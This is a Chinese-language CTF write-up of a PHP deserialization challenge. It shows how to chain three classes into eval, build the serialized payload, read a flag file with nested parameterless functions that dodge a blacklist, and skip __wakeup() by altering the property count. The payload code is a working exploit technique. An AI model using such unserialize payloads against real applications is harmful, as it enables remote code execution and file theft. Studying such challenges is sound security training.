# MiniLCTF2020 - Let's_Play_Dolls

## 题目简述

入口对 GET 参数直接执行 `unserialize()`。三个类可以组成 `foo3 -> foo2 -> foo1` 的 POP 链：`foo3::__destruct()` 对属性调用 `file_exists()`，触发 `foo2::__toString()`；后者再调用 `foo1::execute()`。最终表达式只能是无参数函数嵌套，并受函数名黑名单限制。

## 解题过程

先构造对象关系：

```php
$pop = new foo3();
$pop->var = new foo2();
$pop->var->obj = new foo1();
$pop->var->obj->var = 'readfile(end(scandir(getcwd())));';
echo serialize($pop);
```

调用链如下：

```text
foo3::__destruct()
  -> file_exists(foo2)
  -> foo2::__toString()
  -> foo1::execute()
  -> eval(foo1->var)
```

正则 `/[^\W]+\((?R)?\)/` 在替换函数调用后只允许剩下分号，因此不能传字符串实参。`getcwd()` 取得当前目录，`scandir()` 列目录，`end()` 取最后一项，`readfile()` 读取该文件，整个表达式均为无参数嵌套，且不含 `header|bin|hex|oct|dec|na|eval|exec|system|pass`。

`foo1::__wakeup()` 会把 `var` 重置为 `phpinfo();`。原题 PHP 7.4 环境中，参赛解法通过把序列化串内 `foo1` 声明的属性数从实际的 1 改成 2，使目标版本不调用该 `__wakeup()`。这是版本相关行为，应在对应镜像中验证，不能把它当成所有 PHP 版本都成立的通用绕过。

反序列化后会读取目录末项 `youCanGet1tmaybe`，响应即包含 flag。

## 方法总结

POP 链要逐个确认触发条件：析构、隐式字符串转换、方法调用和最终危险函数缺一不可。无参数 RCE 的本质是用返回值继续喂给下一个无参函数；同时，任何依赖反序列化版本差异的 `__wakeup()` 绕过都应明确 PHP 版本边界。
